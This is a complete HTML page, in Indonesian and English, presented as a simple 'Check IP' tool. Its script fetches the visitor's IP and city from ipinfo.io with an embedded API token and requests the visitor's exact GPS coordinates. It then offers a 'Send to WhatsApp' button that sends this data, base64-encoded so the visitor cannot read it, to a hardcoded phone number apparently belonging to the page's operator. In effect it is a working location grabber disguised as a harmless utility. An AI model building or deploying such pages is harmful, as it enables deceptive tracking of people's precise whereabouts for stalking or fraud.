<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP and Location Tracker</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 50px;
            text-align: center;
        }
        #ip-display {
            font-size: 18px;
            margin: 20px 0;
            font-weight: bold;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
        }
        #send-wa {
            display: none; /* Tombol WhatsApp disembunyikan */
        }
    </style>
</head>
<body>
    <h1>< Cek IP ></h1>
    <p>Click tombol dibawah untuk mengecek IP anda.</p>
    <div id="ip-display">Your IP: </div>
    <button id="check-ip" onclick="getIPAndLocation()">Check IP</button>
    <button id="send-wa" onclick="sendToWhatsApp()">Send to WhatsApp</button>

    <script>
        let ipData = {};

        async function getIPAndLocation() {
            const ipDisplay = document.getElementById('ip-display');
            const sendButton = document.getElementById('send-wa');
            try {
                // Fetch IP and location data
                const response = await fetch('https://ipinfo.io/json?token=6d8519218e7b69');
                if (!response.ok) throw new Error('Failed to fetch IP information.');
                const data = await response.json();

                // Get user's location permissions
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const userLocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                        };

                        // Combine IP data with location
                        ipData = {
                            ip: data.ip,
                            city: data.city,
                            region: data.region,
                            country: data.country,
                            loc: userLocation.latitude + ',' + userLocation.longitude,
                        };

                        // Display IP and show the Send button
                        ipDisplay.textContent = `Your IP: ${ipData.ip}`;
                        sendButton.style.display = 'inline-block'; // Tampilkan tombol Send WhatsApp
                    },
                    (error) => {
                        alert('Permission for location access denied.');
                        console.error(error);
                    }
                );
            } catch (err) {
                ipDisplay.textContent = 'Error fetching IP data.';
                console.error(err);
            }
        }

        function sendToWhatsApp() {
            const encodedMessage = btoa(
                `IP: ${ipData.ip}\nLocation: ${ipData.city}, ${ipData.region}, ${ipData.country}\nCoordinates: ${ipData.loc}`
            );

            // Send to your WhatsApp number
            const whatsappURL = `https://wa.me/6287713740114?text=${encodeURIComponent(encodedMessage)}`;
            window.open(whatsappURL, '_blank');
        }
    </script>
</body>
    </html>
